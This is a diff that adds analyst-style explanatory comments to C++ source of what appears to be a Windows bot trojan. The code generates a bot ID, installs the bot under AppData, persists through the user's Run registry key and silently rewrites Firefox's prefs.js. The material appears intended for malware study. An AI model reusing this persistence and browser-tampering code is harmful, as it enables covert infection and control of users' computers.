@@ -11,7 +11,7 @@ char *UnEnc(char *enc, char *key, DWORD encLen)
 
 ULONG PseudoRand(ULONG *seed)
 {
-   return (*seed = 1352459 * (*seed) + 2529004207);
+   return (*seed = 1352459 * (*seed) + 2529004207);                                             // undefined behavior; integer overflow
 }
 
 void GetBotId(char *botId)
@@ -20,26 +20,26 @@ void GetBotId(char *botId)
    CHAR volumeName[8] = { 0 };
    DWORD seed = 0;
 
-   if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))
+   if(!Funcs::pGetWindowsDirectoryA(windowsDirectory, sizeof(windowsDirectory)))                // path to the Windows directory
       windowsDirectory[0] = L'C';
    
-   volumeName[0] = windowsDirectory[0];   
+   volumeName[0] = windowsDirectory[0];
    volumeName[1] = ':';
    volumeName[2] = '\\';
    volumeName[3] = '\0';
 
-   Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);
-
+   Funcs::pGetVolumeInformationA(volumeName, NULL, 0, &seed, 0, NULL, NULL, 0);                 // volume serial number is used as a seed for a botid
+                                                                                                // generation (VSN is unique for each drive)
    GUID guid;
    guid.Data1 =          PseudoRand(&seed);
    
-   guid.Data2 = (USHORT) PseudoRand(&seed);
+   guid.Data2 = (USHORT) PseudoRand(&seed);                                                     // never used later
    guid.Data3 = (USHORT) PseudoRand(&seed);
    for(int i = 0; i < 8; i++)
       guid.Data4[i] = (UCHAR) PseudoRand(&seed);
 
-   Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]);
-}
+   Funcs::pWsprintfA(botId, "%08lX%04lX%lu", guid.Data1, guid.Data3, *(ULONG*) &guid.Data4[2]); // botid is a string containing 12 hex digits followed by
+}                                                                                               // an unspecified number of decimal digits
 
 void Obfuscate(BYTE *buffer, DWORD bufferSize, char *key)
 {
@@ -79,40 +79,40 @@ void GetInstallPath(char *installPath)
 {
    char botId[BOT_ID_LEN] = { 0 };
    GetBotId(botId);
-   Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, installPath);
+   Funcs::pSHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, installPath);                         // saves path to appdata folder
+   Funcs::pLstrcatA(installPath, Strs::fileDiv);
+   Funcs::pLstrcatA(installPath, botId);                                                        // path to appdata + '\' + botId 
+
+   Funcs::pCreateDirectoryA(installPath, NULL);                                                 // creates botid directory with default
+                                                                                                // security descriptor
    Funcs::pLstrcatA(installPath, Strs::fileDiv);
    Funcs::pLstrcatA(installPath, botId);
-
-   Funcs::pCreateDirectoryA(installPath, NULL); 
-
-   Funcs::pLstrcatA(installPath, Strs::fileDiv);
-   Funcs::pLstrcatA(installPath, botId);
-   Funcs::pLstrcatA(installPath, Strs::exeExt);
+   Funcs::pLstrcatA(installPath, Strs::exeExt);                                                 // installPath + '\' + '.exe'
 }
 
 BOOL GetUserSidStr(PCHAR *sidStr)
 {
    DWORD   userNameSize = MAX_PATH;
    char    userName[MAX_PATH] = { 0 };
-   Funcs::pGetUserNameExA(NameSamCompatible, userName, &userNameSize);
+   Funcs::pGetUserNameExA(NameSamCompatible, userName, &userNameSize);                          // gets username associated with the calling thread
 
-   SID         *sid;
+   SID         *sid;                                                                            // SID is necessary to address regestry keys
    SID_NAME_USE peUse;
-   char        *refDomainName;
+   char        *refDomainName;                                                                  // user domain name (probably a local group)
    DWORD        sidSize           = 0;
    DWORD        refDomainNameSize = 0;
    BOOL         success           = FALSE;
 
-   Funcs::pLookupAccountNameA(NULL, userName, NULL, &sidSize, NULL, &refDomainNameSize, &peUse);
-   if(Funcs::pGetLastError() == ERROR_INSUFFICIENT_BUFFER)
+   Funcs::pLookupAccountNameA(NULL, userName, NULL, &sidSize, NULL, &refDomainNameSize, &peUse);// tries to retrieve user SID and domain name
+   if(Funcs::pGetLastError() == ERROR_INSUFFICIENT_BUFFER)                                      // checks if there was enough space
    {
-      sid           = (SID *)  Alloc(sidSize);
+      sid           = (SID *)  Alloc(sidSize);                                                  // allocates exact amount of space in case of failure
       refDomainName = (char *) Alloc(refDomainNameSize * sizeof(wchar_t));
       if(sid && refDomainName)
       {
-         if(Funcs::pLookupAccountNameA(NULL, userName, sid, &sidSize, refDomainName, &refDomainNameSize, &peUse))
-         {
-            if(Funcs::pConvertSidToStringSidA(sid, sidStr)) 
+         if(Funcs::pLookupAccountNameA(NULL, userName, sid, &sidSize, refDomainName, &refDomainNameSize, &peUse))  
+         {                                                                                      // retrieves user SID and domain name
+            if(Funcs::pConvertSidToStringSidA(sid, sidStr))                                     // converts SID to a compact format
                success = TRUE;
          }
       }
@@ -128,10 +128,10 @@ HANDLE NtRegOpenKey(PCHAR subKey)
    char    *sid           = NULL;
    HANDLE   hKey          = NULL;
 
-   if(GetUserSidStr(&sid))
+   if(GetUserSidStr(&sid))                                                                      // if user SID is retrieved successfully
    {
-      Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);
-
+      Funcs::pWsprintfA(key, Strs::ntRegPath, sid, subKey);                                     // buffer key contains path to the required subkey
+                                                                                                // formatted as "\\Registry\\User\\%s\\%s"
       UNICODE_STRING uKey;
       uKey.Buffer        = Utf8toUtf16(key);
       uKey.Length        = (USHORT) Funcs::pLstrlenA(key) * sizeof(wchar_t);
@@ -142,11 +142,11 @@ HANDLE NtRegOpenKey(PCHAR subKey)
       objAttribs.Length                     = sizeof(objAttribs);
       objAttribs.Attributes               = OBJ_CASE_INSENSITIVE;
       objAttribs.ObjectName               = &uKey;
-      objAttribs.RootDirectory            = NULL;
-      objAttribs.SecurityDescriptor         = NULL;
-      objAttribs.SecurityQualityOfService = 0;
+      objAttribs.RootDirectory               = NULL;
+      objAttribs.SecurityDescriptor         = NULL;                                             // supposedly, security information
+      objAttribs.SecurityQualityOfService = 0;                                                  // is ignored by NtOpenKey
       
-      Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);
+      Funcs::pNtOpenKey(&hKey, KEY_ALL_ACCESS, &objAttribs);                                    // receives the handle to the key
    }
    Funcs::pLocalFree(sid);
    return hKey;
@@ -158,13 +158,14 @@ NTSTATUS NtRegSetValue(HANDLE hKey, BYTE *valueName, DWORD valueNameSize, DWORD 
    uValueName.Buffer        = (wchar_t *) valueName;
    uValueName.Length        = (USHORT) valueNameSize;
    uValueName.MaximumLength = uValueName.Length;
-   return Funcs::pNtSetValueKey(hKey, &uValueName, NULL, type, data, dataSize);
-}
-
+   return Funcs::pNtSetValueKey(hKey, &uValueName, NULL, type, data, dataSize);                 // replaces the value pointed by ValueName in the key
+                                                                                                // referenced by hKey
+}                                                                                               // type -- type of data to be written
+                                                                                                // data -- pointer to the buffer with data
 void SetStartupValue(char *path)
 {
-   HANDLE hKey = NtRegOpenKey(Strs::userRunKey);
-   char botId[BOT_ID_LEN] = { 0 };
+   HANDLE hKey = NtRegOpenKey(Strs::userRunKey);                                                // gets the handle to the registry key named
+   char botId[BOT_ID_LEN] = { 0 };                                                              // "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    GetBotId(botId);
 
    DWORD    botIdLen   = Funcs::pLstrlenA(botId);
@@ -174,15 +175,15 @@ void SetStartupValue(char *path)
    regValueName[0] = 0;
 
    Funcs::pMemcpy(regValueName + 1, botIdW, botIdSizeW);
-   regValueName[botIdLen + 1] = 0;
+   regValueName[botIdLen + 1] = 0;                                                              // the name of a registry value: botid + botidsize (null-terminated string)
    Funcs::pFree(botIdW);
 
    wchar_t *pathW     = Utf8toUtf16(path);
    DWORD    pathWsize = Funcs::pLstrlenA(path) * sizeof(wchar_t);
 
    NtRegSetValue(hKey, (BYTE *) regValueName, botIdSizeW + sizeof(wchar_t), REG_SZ, (BYTE *) pathW, pathWsize);
-
-   Funcs::pFree(pathW);
+                                                                                                // adds a new value to the Run key that contains bot PE path
+   Funcs::pFree(pathW);                                                                         // this way, bot is added to the list of startup applications
    Funcs::pCloseHandle(hKey);                             
 }
 
@@ -195,8 +196,8 @@ BOOL VerifyPe(BYTE *pe, DWORD peSize)
 
 BOOL IsProcessX64(HANDLE hProcess)
 {
-   SYSTEM_INFO systemInfo;
-   Funcs::pGetNativeSystemInfo(&systemInfo);
+   SYSTEM_INFO systemInfo;                                                                      // structure that stores info about architecture, processors, etc
+   Funcs::pGetNativeSystemInfo(&systemInfo);                                                    // gets system info to check if it is x64
    if(systemInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
       return FALSE;
 
@@ -242,14 +243,14 @@ DWORD GetPidExplorer()
 {
    for(;;)
    {
-      HWND hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);
+      HWND hWnd = Funcs::pFindWindowA(Strs::shell_TrayWnd, NULL);                               // returns handle to a taskbar (shell_TrayWnd)
       if(hWnd)
       {
          DWORD pid;
-         Funcs::pGetWindowThreadProcessId(hWnd, &pid);
+         Funcs::pGetWindowThreadProcessId(hWnd, &pid);                                          // sets taskbar thread id to pid
          return pid;
       }
-      Sleep(500);
+      Sleep(500);                                                                               // if unsuccessful then sleeps and tries again
    }
 }
 
@@ -279,10 +280,10 @@ void SetFirefoxPrefs()
                         if(randomDir[nPos] == '/')
                         {
                            Funcs::pMemcpy(randomDir, randomDir + nPos + 1, (sizeof randomDir - nPos) + 1);
-                           break;                                                               // removes everyting before the first '\' and
+                           break;                                                               // removes everything before the first '\' and
                                                                                                 // copies the rest to randomDir. ("RandomDir" since Mozilla generates
                         }                                                                       // name in a random manner)
-                     }
+                     }                                                                          // Note: this way it works only with default firefox profile.
                      Funcs::pMemset(ffDir, 0, MAX_PATH);
    
                      Funcs::pWsprintfA(ffDir, Strs::exp8, appData,                              // writes the folowing path to buffer:
@@ -294,7 +295,7 @@ void SetFirefoxPrefs()
                         (
                            ffDir, GENERIC_READ | GENERIC_WRITE, 0, 0, 
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0
-                        );                                                                      // success if file already exists
+                        );                                                                      // success if prefs.js already exists
                 
                         if(ffPrefs != INVALID_HANDLE_VALUE)                                     //
                         {
@@ -302,7 +303,7 @@ void SetFirefoxPrefs()
                            char *fBuffer  = (CHAR *) Alloc(fileSize + 1);                       // allocates space for a new buffer
                            DWORD bRead, bWritten;
                            if(Funcs::pReadFile(ffPrefs, fBuffer, fileSize, &bRead, NULL) == TRUE)
-                           {                                                                    // reads file into buffer
+                           {                                                                    // reads prefs.js into buffer
                               fBuffer[bRead] = '\0';                                            // puts terminator at the end
 
                               char botId[BOT_ID_LEN] = { 0 };
@@ -314,11 +315,12 @@ void SetFirefoxPrefs()
                               Funcs::pLstrcatA(botIdComment, Strs::winNewLine);                 // botid + '#' + newline
 
                               if(!Funcs::pStrStrA(fBuffer, botIdComment))
-                              {                                                                 // exp12 is put into prefs.js (changes to be made to Firefox settings)
+                              {                                                                 
                                  Funcs::pWriteFile(ffPrefs, Strs::exp12, Funcs::pLstrlenA(Strs::exp12), &bWritten, NULL);
+                                                                                                // exp12 is written into prefs.js (changes to be made to Firefox settings)
                                  Funcs::pWriteFile(ffPrefs, botIdComment, Funcs::pLstrlenA(botIdComment), &bWritten, NULL);
                               }
-                              Funcs::pCloseHandle(ffPrefs);                                     // closes handle if exp12 are written to prefs.js
+                              Funcs::pCloseHandle(ffPrefs);                                     // closes handle if exp12 is written to prefs.js
                               return;
                            }  
                            Funcs::pFree(fBuffer);                                           
@@ -329,7 +331,7 @@ void SetFirefoxPrefs()
                   }
                }
                entry += Funcs::pLstrlenA(entry) + 1;                                            // continues search if "Profile" section is not found yet
-               if(!entry[0])                                                                    // stops if no sections left
+               if(!entry[0])                                                                    // stops if entry is empty
                   break; 
             }
          }
@@ -467,10 +469,10 @@ static void DownloadDll(char *path, BOOL x64, char *botId)
 
 void GetTempPathBotPrefix(char *path)
 {
-   Funcs::pGetTempPathA(MAX_PATH, path);
+   Funcs::pGetTempPathA(MAX_PATH, path);                                                        // retrieves path to directory of temporary files
    char botId[BOT_ID_LEN] = { 0 };
    GetBotId(botId);
-   Funcs::pLstrcatA(path, botId);
+   Funcs::pLstrcatA(path, botId);                                                               // temp dir + botid
 } 
 
 static HANDLE hX86 = NULL;
